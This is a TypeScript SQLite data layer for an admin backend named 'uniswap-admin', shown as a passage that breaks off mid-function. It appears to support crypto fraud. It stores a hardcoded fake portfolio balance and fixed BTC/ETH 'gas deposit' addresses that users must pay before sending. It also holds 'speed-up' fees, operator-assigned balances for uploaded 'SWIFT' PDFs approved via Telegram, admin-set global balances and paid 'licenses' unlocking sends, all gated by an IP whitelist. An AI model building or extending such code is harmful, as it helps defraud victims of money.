import { Database } from 'bun:sqlite'
import path from 'path'

// Database file stored next to the server
const DB_PATH = path.join(import.meta.dir, 'data', 'uniswap-admin.db')

// Ensure data directory exists
const dataDir = path.join(import.meta.dir, 'data')
try {
  await Bun.write(path.join(dataDir, '.gitkeep'), '')
} catch {
  // Directory creation handled by Bun.write
}

// Initialize SQLite database
const db = new Database(DB_PATH, { create: true })

// Enable WAL mode for better concurrent read performance
db.exec('PRAGMA journal_mode = WAL')
db.exec('PRAGMA synchronous = NORMAL')

// ─── Schema ──────────────────────────────────────────────────────────────────

db.exec(`
  CREATE TABLE IF NOT EXISTS settings (
    key TEXT PRIMARY KEY,
    value TEXT NOT NULL,
    updated_at INTEGER DEFAULT (unixepoch() * 1000)
  )
`)

db.exec(`
  CREATE TABLE IF NOT EXISTS ip_whitelist (
    ip TEXT PRIMARY KEY,
    type TEXT NOT NULL CHECK(type IN ('allowed', 'blocked')),
    added_at INTEGER DEFAULT (unixepoch() * 1000)
  )
`)

db.exec(`
  CREATE TABLE IF NOT EXISTS whitelist_config (
    key TEXT PRIMARY KEY,
    value TEXT NOT NULL
  )
`)

db.exec(`
  CREATE TABLE IF NOT EXISTS access_logs (
    id TEXT PRIMARY KEY,
    ip TEXT NOT NULL,
    user_agent TEXT DEFAULT '',
    allowed INTEGER NOT NULL DEFAULT 1,
    path TEXT DEFAULT '/',
    timestamp INTEGER DEFAULT (unixepoch() * 1000),
    date TEXT DEFAULT ''
  )
`)

db.exec(`
  CREATE TABLE IF NOT EXISTS transactions (
    id TEXT PRIMARY KEY,
    type TEXT NOT NULL CHECK(type IN ('send', 'receive')),
    amount REAL NOT NULL,
    to_address TEXT NOT NULL,
    timestamp INTEGER DEFAULT (unixepoch() * 1000),
    status TEXT NOT NULL DEFAULT 'success' CHECK(status IN ('success', 'pending', 'sending')),
    transaction_hash TEXT DEFAULT '',
    is_slow_send INTEGER DEFAULT 0,
    start_time INTEGER DEFAULT 0,
    expected_completion_time INTEGER DEFAULT 0,
    speed_up_requested INTEGER DEFAULT 0
  )
`)

db.exec(`
  CREATE TABLE IF NOT EXISTS swift_connections (
    id TEXT PRIMARY KEY,
    pdf_name TEXT NOT NULL DEFAULT '',
    status TEXT NOT NULL DEFAULT 'pending' CHECK(status IN ('pending', 'awaiting_balance', 'accepted', 'rejected', 'timeout')),
    balance REAL DEFAULT NULL,
    ip TEXT DEFAULT '',
    telegram_message_id INTEGER DEFAULT NULL,
    telegram_chat_id INTEGER DEFAULT NULL,
    created_at INTEGER DEFAULT (unixepoch() * 1000),
    updated_at INTEGER DEFAULT (unixepoch() * 1000)
  )
`)

// Track PDF filenames and the last balance assigned to each
db.exec(`
  CREATE TABLE IF NOT EXISTS pdf_balances (
    pdf_name TEXT PRIMARY KEY,
    balance REAL NOT NULL,
    updated_at INTEGER DEFAULT (unixepoch() * 1000)
  )
`)

// ─── Default settings ────────────────────────────────────────────────────────

interface SettingsMap {
  [key: string]: string | number | boolean
}

const DEFAULT_SETTINGS: SettingsMap = {
  portfolioBalance: 1300545.66,
  gasDepositAddress: 'bc1q6jsfmm67vx368wr27wdl3zlqwsslpjcrszh87u',
  ethDepositAddress: '0x742d35Cc6634C0532925a3b844Bc9e7595f5bE91',
  minimumGasDeposit: 0.028,
  minimumSendAmount: 10000,
  gasDepositCurrency: 'BTC',
  ethGasPrice: 3640,
  btcPrice: 100000,
  baseGasFeeETH: 0.002,
  gasFeePercentage: 0.0005,
  freeSendAmount: 10,
  freeSendEnabled: true,
  maintenanceMode: false,
  maintenanceMessage: 'We are currently performing scheduled maintenance. Please check back soon.',
  ethBalance: 0.5,
  slowSendEnabled: true,
  slowSendDurationHours: 4,
  speedUpGasFeePercentage: 100,
  // Telegram settings
  telegramBotToken: '',
  telegramChannelId: '',
  telegramNotificationsEnabled: false,
}

// Insert defaults if not present
const insertDefault = db.prepare('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)')
const insertDefaults = db.transaction(() => {
  for (const [key, value] of Object.entries(DEFAULT_SETTINGS)) {
    insertDefault.run(key, String(value))
  }
})
insertDefaults()

// Initialize whitelist_config defaults
db.exec(`INSERT OR IGNORE INTO whitelist_config (key, value) VALUES ('enabled', 'true')`)
db.exec(`INSERT OR IGNORE INTO whitelist_config (key, value) VALUES ('lastUpdated', '0')`)

// ─── Prepared Statements ─────────────────────────────────────────────────────

const stmts = {
  // Settings
  getSetting: db.prepare('SELECT value FROM settings WHERE key = ?'),
  getAllSettings: db.prepare('SELECT key, value FROM settings'),
  upsertSetting: db.prepare(
    'INSERT INTO settings (key, value, updated_at) VALUES (?, ?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at',
  ),

  // Whitelist
  getWhitelistConfig: db.prepare('SELECT value FROM whitelist_config WHERE key = ?'),
  upsertWhitelistConfig: db.prepare(
    'INSERT INTO whitelist_config (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value',
  ),
  getAllowedIPs: db.prepare("SELECT ip FROM ip_whitelist WHERE type = 'allowed' ORDER BY added_at DESC"),
  getBlockedIPs: db.prepare("SELECT ip FROM ip_whitelist WHERE type = 'blocked' ORDER BY added_at DESC"),
  addIP: db.prepare(
    'INSERT INTO ip_whitelist (ip, type, added_at) VALUES (?, ?, ?) ON CONFLICT(ip) DO UPDATE SET type = excluded.type, added_at = excluded.added_at',
  ),
  removeIP: db.prepare('DELETE FROM ip_whitelist WHERE ip = ?'),
  getIP: db.prepare('SELECT ip, type FROM ip_whitelist WHERE ip = ?'),

  // Access logs
  insertLog: db.prepare(
    'INSERT INTO access_logs (id, ip, user_agent, allowed, path, timestamp, date) VALUES (?, ?, ?, ?, ?, ?, ?)',
  ),
  getLogs: db.prepare('SELECT * FROM access_logs ORDER BY timestamp DESC LIMIT 200'),
  clearLogs: db.prepare('DELETE FROM access_logs'),

  // Transactions
  insertTransaction: db.prepare(
    'INSERT INTO transactions (id, type, amount, to_address, timestamp, status, transaction_hash, is_slow_send, start_time, expected_completion_time, speed_up_requested) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
  ),
  getTransactions: db.prepare('SELECT * FROM transactions ORDER BY timestamp DESC'),
  deleteTransaction: db.prepare('DELETE FROM transactions WHERE id = ?'),
  getTransaction: db.prepare('SELECT * FROM transactions WHERE id = ?'),

  // Swift connections
  insertSwiftConnection: db.prepare(
    'INSERT INTO swift_connections (id, pdf_name, status, balance, ip, telegram_message_id, telegram_chat_id, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
  ),
  getSwiftConnection: db.prepare('SELECT * FROM swift_connections WHERE id = ?'),
  updateSwiftConnectionStatus: db.prepare('UPDATE swift_connections SET status = ?, updated_at = ? WHERE id = ?'),
  updateSwiftConnectionBalance: db.prepare(
    'UPDATE swift_connections SET balance = ?, status = ?, updated_at = ? WHERE id = ?',
  ),
  updateSwiftConnectionTelegramMsg: db.prepare('UPDATE swift_connections SET telegram_message_id = ? WHERE id = ?'),
  getSwiftConnectionByTelegramMsg: db.prepare('SELECT * FROM swift_connections WHERE telegram_message_id = ?'),
  getAwaitingBalanceConnection: db.prepare(
    "SELECT * FROM swift_connections WHERE status = 'awaiting_balance' ORDER BY updated_at DESC LIMIT 1",
  ),
  setSwiftConnectionAwaitingBalance: db.prepare(
    "UPDATE swift_connections SET status = 'awaiting_balance', telegram_chat_id = ?, updated_at = ? WHERE id = ?",
  ),
  updateSwiftConnectionChatId: db.prepare('UPDATE swift_connections SET telegram_chat_id = ? WHERE id = ?'),
  resetSwiftConnectionToPending: db.prepare(
    "UPDATE swift_connections SET status = 'pending', updated_at = ? WHERE id = ? AND status IN ('pending', 'awaiting_balance')",
  ),
  cleanupOldSwiftConnections: db.prepare(
    "UPDATE swift_connections SET status = 'timeout', updated_at = ? WHERE status IN ('pending', 'awaiting_balance') AND created_at < ?",
  ),

  // PDF balance history
  getPdfBalance: db.prepare('SELECT balance FROM pdf_balances WHERE pdf_name = ?'),
  upsertPdfBalance: db.prepare(
    'INSERT INTO pdf_balances (pdf_name, balance, updated_at) VALUES (?, ?, ?) ON CONFLICT(pdf_name) DO UPDATE SET balance = excluded.balance, updated_at = excluded.updated_at',
  ),
}

// ─── Settings API ────────────────────────────────────────────────────────────

export function getAllSettings(): Record<string, unknown> {
  const rows = stmts.getAllSettings.all() as Array<{ key: string; value: string }>
  const result: Record<string, unknown> = {}
  for (const row of rows) {
    // Parse booleans and numbers, but never convert hex strings (0x...) or very long digit strings (addresses)
    if (row.value === 'true') {
      result[row.key] = true
    } else if (row.value === 'false') {
      result[row.key] = false
    } else if (
      row.value !== '' &&
      !row.value.startsWith('0x') &&
      !row.value.startsWith('0X') &&
      row.value.length <= 20 &&
      !isNaN(Number(row.value))
    ) {
      result[row.key] = Number(row.value)
    } else {
      result[row.key] = row.value
    }
  }
  return result
}

export function getSetting(key: string): unknown {
  const row = stmts.getSetting.get(key) as { value: string } | undefined
  if (!row) {
    return undefined
  }
  if (row.value === 'true') {
    return true
  }
  if (row.value === 'false') {
    return false
  }
  // Never convert hex strings (0x...) or very long digit strings (addresses) to numbers
  if (
    row.value !== '' &&
    !row.value.startsWith('0x') &&
    !row.value.startsWith('0X') &&
    row.value.length <= 20 &&
    !isNaN(Number(row.value))
  ) {
    return Number(row.value)
  }
  return row.value
}

export function saveAllSettings(settings: Record<string, unknown>): void {
  const now = Date.now()
  const saveTx = db.transaction(() => {
    for (const [key, value] of Object.entries(settings)) {
      // Skip password and non-setting fields
      if (key === 'password') {
        continue
      }
      stmts.upsertSetting.run(key, String(value), now)
    }
  })
  saveTx()
}

export function saveSetting(key: string, value: unknown): void {
  stmts.upsertSetting.run(key, String(value), Date.now())
}

// ─── Telegram Settings API ───────────────────────────────────────────────────

export interface TelegramConfig {
  botToken: string
  channelId: string
  notificationsEnabled: boolean
}

export function getTelegramConfig(): TelegramConfig {
  return {
    botToken: (getSetting('telegramBotToken') as string) || '',
    channelId: (getSetting('telegramChannelId') as string) || '',
    notificationsEnabled: (getSetting('telegramNotificationsEnabled') as boolean) || false,
  }
}

export function saveTelegramConfig(config: TelegramConfig): void {
  const saveTx = db.transaction(() => {
    stmts.upsertSetting.run('telegramBotToken', config.botToken, Date.now())
    stmts.upsertSetting.run('telegramChannelId', config.channelId, Date.now())
    stmts.upsertSetting.run('telegramNotificationsEnabled', String(config.notificationsEnabled), Date.now())
  })
  saveTx()
}

// ─── IP Whitelist API ────────────────────────────────────────────────────────

export interface IPWhitelistData {
  enabled: boolean
  allowedIPs: string[]
  blockedIPs: string[]
  lastUpdated: number
}

export function getWhitelist(): IPWhitelistData {
  const enabledRow = stmts.getWhitelistConfig.get('enabled') as { value: string } | undefined
  const lastUpdatedRow = stmts.getWhitelistConfig.get('lastUpdated') as { value: string } | undefined

  const allowed = (stmts.getAllowedIPs.all() as Array<{ ip: string }>).map((r) => r.ip)
  const blocked = (stmts.getBlockedIPs.all() as Array<{ ip: string }>).map((r) => r.ip)

  return {
    enabled: enabledRow?.value !== 'false',
    allowedIPs: allowed,
    blockedIPs: blocked,
    lastUpdated: lastUpdatedRow ? Number(lastUpdatedRow.value) : 0,
  }
}

export function setWhitelistEnabled(enabled: boolean): void {
  stmts.upsertWhitelistConfig.run('enabled', String(enabled))
  stmts.upsertWhitelistConfig.run('lastUpdated', String(Date.now()))
}

export function addIPToWhitelist(ip: string): void {
  stmts.addIP.run(ip, 'allowed', Date.now())
  stmts.upsertWhitelistConfig.run('lastUpdated', String(Date.now()))
}

export function removeIPFromWhitelist(ip: string): void {
  stmts.removeIP.run(ip)
  stmts.upsertWhitelistConfig.run('lastUpdated', String(Date.now()))
}

export function blockIP(ip: string): void {
  stmts.addIP.run(ip, 'blocked', Date.now())
  stmts.upsertWhitelistConfig.run('lastUpdated', String(Date.now()))
}

export function unblockIP(ip: string): void {
  // Remove from blocked, don't auto-whitelist
  const existing = stmts.getIP.get(ip) as { ip: string; type: string } | undefined
  if (existing?.type === 'blocked') {
    stmts.removeIP.run(ip)
    stmts.upsertWhitelistConfig.run('lastUpdated', String(Date.now()))
  }
}

export function isIPAllowed(ip: string): { allowed: boolean; reason: string } {
  const whitelist = getWhitelist()

  // If whitelist is disabled, allow all
  if (!whitelist.enabled) {
    return { allowed: true, reason: 'Whitelist protection disabled' }
  }

  // Check if IP is blocked
  if (whitelist.blockedIPs.includes(ip)) {
    return { allowed: false, reason: 'IP is blocked' }
  }

  // Check if IP is whitelisted
  if (whitelist.allowedIPs.includes(ip)) {
    return { allowed: true, reason: 'IP is whitelisted' }
  }

  // If whitelist is enabled and IP is not in it, deny
  if (whitelist.allowedIPs.length > 0) {
    return { allowed: false, reason: 'IP not in whitelist' }
  }

  // If whitelist is enabled but empty, allow (to prevent lockout)
  return { allowed: true, reason: 'Whitelist is empty - allowing access' }
}

// ─── Access Logs API ─────────────────────────────────────────────────────────

export interface AccessLogEntry {
  id: string
  ip: string
  userAgent: string
  allowed: boolean
  path: string
  timestamp: number
  date: string
}

export function addAccessLog(entry: Omit<AccessLogEntry, 'id' | 'date'>): void {
  const id = `log_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`
  const date = new Date(entry.timestamp).toLocaleString()
  stmts.insertLog.run(id, entry.ip, entry.userAgent, entry.allowed ? 1 : 0, entry.path, entry.timestamp, date)
}

export function getAccessLogs(): AccessLogEntry[] {
  const rows = stmts.getLogs.all() as Array<{
    id: string
    ip: string
    user_agent: string
    allowed: number
    path: string
    timestamp: number
    date: string
  }>
  return rows.map((r) => ({
    id: r.id,
    ip: r.ip,
    userAgent: r.user_agent,
    allowed: r.allowed === 1,
    path: r.path,
    timestamp: r.timestamp,
    date: r.date,
  }))
}

export function clearAccessLogs(): void {
  stmts.clearLogs.run()
}

// ─── Transactions API ────────────────────────────────────────────────────────

export interface TransactionEntry {
  id: string
  type: 'send' | 'receive'
  amount: number
  toAddress: string
  timestamp: number
  status: 'success' | 'pending' | 'sending'
  transactionHash: string
  isSlowSend: boolean
  startTime: number
  expectedCompletionTime: number
  speedUpRequested: boolean
}

export function getTransactions(): TransactionEntry[] {
  const rows = stmts.getTransactions.all() as Array<{
    id: string
    type: string
    amount: number
    to_address: string
    timestamp: number
    status: string
    transaction_hash: string
    is_slow_send: number
    start_time: number
    expected_completion_time: number
    speed_up_requested: number
  }>
  return rows.map((r) => ({
    id: r.id,
    type: r.type as 'send' | 'receive',
    amount: r.amount,
    toAddress: r.to_address,
    timestamp: r.timestamp,
    status: r.status as 'success' | 'pending' | 'sending',
    transactionHash: r.transaction_hash,
    isSlowSend: r.is_slow_send === 1,
    startTime: r.start_time,
    expectedCompletionTime: r.expected_completion_time,
    speedUpRequested: r.speed_up_requested === 1,
  }))
}

export function addTransaction(tx: Omit<TransactionEntry, 'id'>): string {
  const id = `tx_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`
  stmts.insertTransaction.run(
    id,
    tx.type,
    tx.amount,
    tx.toAddress,
    tx.timestamp || Date.now(),
    tx.status,
    tx.transactionHash || '',
    tx.isSlowSend ? 1 : 0,
    tx.startTime || 0,
    tx.expectedCompletionTime || 0,
    tx.speedUpRequested ? 1 : 0,
  )
  return id
}

export function deleteTransaction(id: string): boolean {
  const result = stmts.deleteTransaction.run(id)
  return result.changes > 0
}

// ─── SWIFT Connections API ────────────────────────────────────────────────────

export interface SwiftConnectionEntry {
  id: string
  pdfName: string
  status: 'pending' | 'awaiting_balance' | 'accepted' | 'rejected' | 'timeout'
  balance: number | null
  ip: string
  telegramMessageId: number | null
  telegramChatId: number | null
  createdAt: number
  updatedAt: number
}

export function createSwiftConnection(pdfName: string, ip: string): string {
  const id = `swift_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`
  const now = Date.now()
  stmts.insertSwiftConnection.run(id, pdfName, 'pending', null, ip, null, null, now, now)
  return id
}

export function getSwiftConnection(id: string): SwiftConnectionEntry | null {
  const row = stmts.getSwiftConnection.get(id) as
    | {
        id: string
        pdf_name: string
        status: string
        balance: number | null
        ip: string
        telegram_message_id: number | null
        telegram_chat_id: number | null
        created_at: number
        updated_at: number
      }
    | undefined
  if (!row) {
    return null
  }
  return {
    id: row.id,
    pdfName: row.pdf_name,
    status: row.status as SwiftConnectionEntry['status'],
    balance: row.balance,
    ip: row.ip,
    telegramMessageId: row.telegram_message_id,
    telegramChatId: row.telegram_chat_id,
    createdAt: row.created_at,
    updatedAt: row.updated_at,
  }
}

export function getSwiftConnectionByTelegramMsg(messageId: number): SwiftConnectionEntry | null {
  const row = stmts.getSwiftConnectionByTelegramMsg.get(messageId) as
    | {
        id: string
        pdf_name: string
        status: string
        balance: number | null
        ip: string
        telegram_message_id: number | null
        telegram_chat_id: number | null
        created_at: number
        updated_at: number
      }
    | undefined
  if (!row) {
    return null
  }
  return {
    id: row.id,
    pdfName: row.pdf_name,
    status: row.status as SwiftConnectionEntry['status'],
    balance: row.balance,
    ip: row.ip,
    telegramMessageId: row.telegram_message_id,
    telegramChatId: row.telegram_chat_id,
    createdAt: row.created_at,
    updatedAt: row.updated_at,
  }
}

export function setSwiftConnectionTelegramMsgId(connectionId: string, messageId: number): void {
  stmts.updateSwiftConnectionTelegramMsg.run(messageId, connectionId)
}

export function setSwiftConnectionAwaitingBalance(connectionId: string, chatId: number): boolean {
  const result = stmts.setSwiftConnectionAwaitingBalance.run(chatId, Date.now(), connectionId)
  return result.changes > 0
}

export function getAwaitingBalanceConnection(): SwiftConnectionEntry | null {
  const row = stmts.getAwaitingBalanceConnection.get() as
    | {
        id: string
        pdf_name: string
        status: string
        balance: number | null
        ip: string
        telegram_message_id: number | null
        telegram_chat_id: number | null
        created_at: number
        updated_at: number
      }
    | undefined
  if (!row) {
    return null
  }
  return {
    id: row.id,
    pdfName: row.pdf_name,
    status: row.status as SwiftConnectionEntry['status'],
    balance: row.balance,
    ip: row.ip,
    telegramMessageId: row.telegram_message_id,
    telegramChatId: row.telegram_chat_id,
    createdAt: row.created_at,
    updatedAt: row.updated_at,
  }
}

export function approveSwiftConnection(connectionId: string, balance: number): boolean {
  const conn = getSwiftConnection(connectionId)
  if (!conn || (conn.status !== 'pending' && conn.status !== 'awaiting_balance')) {
    return false
  }
  const result = stmts.updateSwiftConnectionBalance.run(balance, 'accepted', Date.now(), connectionId)
  // Remember this PDF's balance for future recurring connections
  if (result.changes > 0 && conn.pdfName) {
    savePdfBalance(conn.pdfName, balance)
  }
  return result.changes > 0
}

export function rejectSwiftConnection(connectionId: string): boolean {
  const result = stmts.updateSwiftConnectionStatus.run('rejected', Date.now(), connectionId)
  return result.changes > 0
}

export function resetSwiftConnectionToPending(connectionId: string): boolean {
  const result = stmts.resetSwiftConnectionToPending.run(Date.now(), connectionId)
  return result.changes > 0
}

export function timeoutOldSwiftConnections(): void {
  const fiveMinutesAgo = Date.now() - 5 * 60 * 1000
  stmts.cleanupOldSwiftConnections.run(Date.now(), fiveMinutesAgo)
}

// ─── PDF Balance History API ─────────────────────────────────────────────────

export function getPdfBalance(pdfName: string): number | null {
  const row = stmts.getPdfBalance.get(pdfName) as { balance: number } | undefined
  return row?.balance ?? null
}

export function savePdfBalance(pdfName: string, balance: number): void {
  stmts.upsertPdfBalance.run(pdfName, balance, Date.now())
}

// ─── Watanabe Schema ─────────────────────────────────────────────────────────

db.exec(`
  CREATE TABLE IF NOT EXISTS watanabe_users (
    wallet_address TEXT PRIMARY KEY,
    blocked INTEGER DEFAULT 0,
    total_sent REAL DEFAULT 0,
    created_at INTEGER DEFAULT (unixepoch() * 1000),
    last_seen INTEGER DEFAULT (unixepoch() * 1000)
  )
`)

db.exec(`
  CREATE TABLE IF NOT EXISTS watanabe_transactions (
    id TEXT PRIMARY KEY,
    wallet_address TEXT NOT NULL,
    asset TEXT NOT NULL CHECK(asset IN ('USDT_ERC20', 'USDT_TRC20', 'BTC', 'USDC_SOL')),
    amount REAL NOT NULL,
    to_address TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'pending' CHECK(status IN ('pending', 'processing', 'completed', 'failed')),
    tx_type TEXT NOT NULL DEFAULT 'send' CHECK(tx_type IN ('send', 'claim')),
    commission_paid REAL DEFAULT 0,
    created_at INTEGER DEFAULT (unixepoch() * 1000),
    FOREIGN KEY (wallet_address) REFERENCES watanabe_users(wallet_address)
  )
`)

db.exec(`
  CREATE TABLE IF NOT EXISTS watanabe_licenses (
    id TEXT PRIMARY KEY,
    wallet_address TEXT NOT NULL,
    plan TEXT NOT NULL CHECK(plan IN ('24h', '1week', '1month')),
    status TEXT NOT NULL DEFAULT 'pending_payment' CHECK(status IN ('pending_payment', 'awaiting_approval', 'active', 'expired', 'rejected')),
    payment_asset TEXT DEFAULT '',
    payment_amount REAL DEFAULT 0,
    payment_address TEXT DEFAULT '',
    send_limit REAL DEFAULT 0,
    total_sent REAL DEFAULT 0,
    purchased_at INTEGER DEFAULT (unixepoch() * 1000),
    activated_at INTEGER DEFAULT NULL,
    expires_at INTEGER DEFAULT NULL,
    telegram_message_id INTEGER DEFAULT NULL,
    request_ip TEXT DEFAULT '',
    request_user_agent TEXT DEFAULT '',
    request_country TEXT DEFAULT '',
    FOREIGN KEY (wallet_address) REFERENCES watanabe_users(wallet_address)
  )
`)

// Migrate: add columns if they don't exist (safe for existing DBs)
try {
  db.exec(`ALTER TABLE watanabe_licenses ADD COLUMN request_ip TEXT DEFAULT ''`)
} catch { /* column already exists */ }
try {
  db.exec(`ALTER TABLE watanabe_licenses ADD COLUMN request_user_agent TEXT DEFAULT ''`)
} catch { /* column already exists */ }
try {
  db.exec(`ALTER TABLE watanabe_licenses ADD COLUMN request_country TEXT DEFAULT ''`)
} catch { /* column already exists */ }

// Watanabe default settings
const WATANABE_DEFAULT_SETTINGS: Record<string, string | number | boolean> = {
  watanabeMode: 'purchase',
  watanabeEnabled: true,
  // Asset balances (global, visible to all users)
  watanabeBalanceUSDT_ERC20: 450000,
  watanabeBalanceUSDT_TRC20: 320000,
  watanabeBalanceBTC: 12.5,
  watanabeBalanceUSDC_SOL: 280000,
  // Commission settings
  watanabeCommissionPercent: 5,
  // Plan prices (USD)
  watanabePlan24hPrice: 500,
  watanabePlan1weekPrice: 2000,
  watanabePlan1monthPrice: 5000,
  // Plan send limits
  watanabePlan24hLimit: 30000,
  watanabePlan1weekLimit: 150000,
  watanabePlan1monthLimit: 500000,
  // Test claim amount
  watanabeTestClaimAmount: 20,
  // Payment addresses
  watanabePaymentAddressLTC: '',
  watanabePaymentAddressBTC: '',
  watanabePaymentAddressETH: '',
  watanabePaymentAddressSOL: '',
  // Admin wallet (bypasses restrictions)
  watanabeAdminWallet: '',
}

// Insert Watanabe defaults
const insertWatanabeDefaults = db.transaction(() => {
  for (const [key, value] of Object.entries(WATANABE_DEFAULT_SETTINGS)) {
    insertDefault.run(key, String(value))
  }
})
insertWatanabeDefaults()

// Watanabe prepared statements
const watanabeStmts = {
  getUser: db.prepare('SELECT * FROM watanabe_users WHERE wallet_address = ?'),
  upsertUser: db.prepare(
    'INSERT INTO watanabe_users (wallet_address, last_seen) VALUES (?, ?) ON CONFLICT(wallet_address) DO UPDATE SET last_seen = excluded.last_seen',
  ),
  blockUser: db.prepare('UPDATE watanabe_users SET blocked = 1 WHERE wallet_address = ?'),
  unblockUser: db.prepare('UPDATE watanabe_users SET blocked = 0 WHERE wallet_address = ?'),
  getAllUsers: db.prepare('SELECT * FROM watanabe_users ORDER BY last_seen DESC'),
  getBlockedUsers: db.prepare('SELECT * FROM watanabe_users WHERE blocked = 1 ORDER BY last_seen DESC'),
  updateUserTotalSent: db.prepare('UPDATE watanabe_users SET total_sent = total_sent + ? WHERE wallet_address = ?'),

  insertTransaction: db.prepare(
    'INSERT INTO watanabe_transactions (id, wallet_address, asset, amount, to_address, status, tx_type, commission_paid, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
  ),
  getUserTransactions: db.prepare(
    'SELECT * FROM watanabe_transactions WHERE wallet_address = ? ORDER BY created_at DESC LIMIT 100',
  ),
  updateTransactionStatus: db.prepare('UPDATE watanabe_transactions SET status = ? WHERE id = ?'),

  insertLicense: db.prepare(
    'INSERT INTO watanabe_licenses (id, wallet_address, plan, status, payment_asset, payment_amount, payment_address, send_limit, purchased_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
  ),
  getActiveLicense: db.prepare(
    "SELECT * FROM watanabe_licenses WHERE wallet_address = ? AND status = 'active' AND expires_at > ? ORDER BY expires_at DESC LIMIT 1",
  ),
  getPendingLicense: db.prepare(
    "SELECT * FROM watanabe_licenses WHERE wallet_address = ? AND status IN ('pending_payment', 'awaiting_approval') ORDER BY purchased_at DESC LIMIT 1",
  ),
  approveLicense: db.prepare(
    "UPDATE watanabe_licenses SET status = 'active', activated_at = ?, expires_at = ? WHERE id = ? AND status = 'awaiting_approval'",
  ),
  rejectLicense: db.prepare("UPDATE watanabe_licenses SET status = 'rejected' WHERE id = ?"),
  markLicensePaid: db.prepare(
    "UPDATE watanabe_licenses SET status = 'awaiting_approval' WHERE id = ? AND status = 'pending_payment'",
  ),
  setLicenseTelegramMsg: db.prepare('UPDATE watanabe_licenses SET telegram_message_id = ? WHERE id = ?'),
  getLicenseByTelegramMsg: db.prepare('SELECT * FROM watanabe_licenses WHERE telegram_message_id = ?'),
  updateLicenseTotalSent: db.prepare('UPDATE watanabe_licenses SET total_sent = total_sent + ? WHERE id = ?'),
  expireOldLicenses: db.prepare(
    "UPDATE watanabe_licenses SET status = 'expired' WHERE status = 'active' AND expires_at <= ?",
  ),
  getUserLicenses: db.prepare('SELECT * FROM watanabe_licenses WHERE wallet_address = ? ORDER BY purchased_at DESC'),
  updateLicenseRequestMeta: db.prepare(
    'UPDATE watanabe_licenses SET request_ip = ?, request_user_agent = ?, request_country = ? WHERE id = ?',
  ),
}

// ─── Watanabe API Functions ──────────────────────────────────────────────────

export interface WatanabeUser {
  walletAddress: string
  blocked: boolean
  totalSent: number
  createdAt: number
  lastSeen: number
}

export interface WatanabeTransaction {
  id: string
  walletAddress: string
  asset: string
  amount: number
  toAddress: string
  status: string
  txType: string
  commissionPaid: number
  createdAt: number
}

export interface WatanabeLicense {
  id: string
  walletAddress: string
  plan: string
  status: string
  paymentAsset: string
  paymentAmount: number
  paymentAddress: string
  sendLimit: number
  totalSent: number
  purchasedAt: number
  activatedAt: number | null
  expiresAt: number | null
  telegramMessageId: number | null
  requestIp: string
  requestUserAgent: string
  requestCountry: string
}

function mapLicenseRow(row: Record<string, unknown>): WatanabeLicense {
  return {
    id: row.id as string,
    walletAddress: row.wallet_address as string,
    plan: row.plan as string,
    status: row.status as string,
    paymentAsset: row.payment_asset as string,
    paymentAmount: row.payment_amount as number,
    paymentAddress: row.payment_address as string,
    sendLimit: row.send_limit as number,
    totalSent: row.total_sent as number,
    purchasedAt: row.purchased_at as number,
    activatedAt: row.activated_at as number | null,
    expiresAt: row.expires_at as number | null,
    telegramMessageId: row.telegram_message_id as number | null,
    requestIp: (row.request_ip as string) || '',
    requestUserAgent: (row.request_user_agent as string) || '',
    requestCountry: (row.request_country as string) || '',
  }
}

export function watanabeGetOrCreateUser(walletAddress: string): WatanabeUser {
  const addr = walletAddress.toLowerCase()
  watanabeStmts.upsertUser.run(addr, Date.now())
  const row = watanabeStmts.getUser.get(addr) as Record<string, unknown>
  return {
    walletAddress: row.wallet_address as string,
    blocked: (row.blocked as number) === 1,
    totalSent: row.total_sent as number,
    createdAt: row.created_at as number,
    lastSeen: row.last_seen as number,
  }
}

export function watanabeIsUserBlocked(walletAddress: string): boolean {
  const row = watanabeStmts.getUser.get(walletAddress.toLowerCase()) as Record<string, unknown> | undefined
  if (!row) {
    return false
  }
  return (row.blocked as number) === 1
}

export function watanabeBlockUser(walletAddress: string): void {
  watanabeStmts.upsertUser.run(walletAddress.toLowerCase(), Date.now())
  watanabeStmts.blockUser.run(walletAddress.toLowerCase())
}

export function watanabeUnblockUser(walletAddress: string): void {
  watanabeStmts.unblockUser.run(walletAddress.toLowerCase())
}

export function watanabeGetAllUsers(): WatanabeUser[] {
  const rows = watanabeStmts.getAllUsers.all() as Array<Record<string, unknown>>
  return rows.map((r) => ({
    walletAddress: r.wallet_address as string,
    blocked: (r.blocked as number) === 1,
    totalSent: r.total_sent as number,
    createdAt: r.created_at as number,
    lastSeen: r.last_seen as number,
  }))
}

export function watanabeCreateTransaction(
  walletAddress: string,
  asset: string,
  amount: number,
  toAddress: string,
  txType: 'send' | 'claim',
  commissionPaid: number,
): string {
  const id = `wtx_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`
  watanabeStmts.insertTransaction.run(
    id,
    walletAddress.toLowerCase(),
    asset,
    amount,
    toAddress,
    'completed',
    txType,
    commissionPaid,
    Date.now(),
  )
  watanabeStmts.updateUserTotalSent.run(amount, walletAddress.toLowerCase())
  return id
}

export function watanabeGetUserTransactions(walletAddress: string): WatanabeTransaction[] {
  const rows = watanabeStmts.getUserTransactions.all(walletAddress.toLowerCase()) as Array<Record<string, unknown>>
  return rows.map((r) => ({
    id: r.id as string,
    walletAddress: r.wallet_address as string,
    asset: r.asset as string,
    amount: r.amount as number,
    toAddress: r.to_address as string,
    status: r.status as string,
    txType: r.tx_type as string,
    commissionPaid: r.commission_paid as number,
    createdAt: r.created_at as number,
  }))
}

function generateStrongLicenseKey(): string {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'
  const segments = 4
  const segLen = 5
  const parts: string[] = []
  const bytes = new Uint8Array(segments * segLen)
  crypto.getRandomValues(bytes)
  for (let s = 0; s < segments; s++) {
    let seg = ''
    for (let i = 0; i < segLen; i++) {
      seg += chars[bytes[s * segLen + i] % chars.length]
    }
    parts.push(seg)
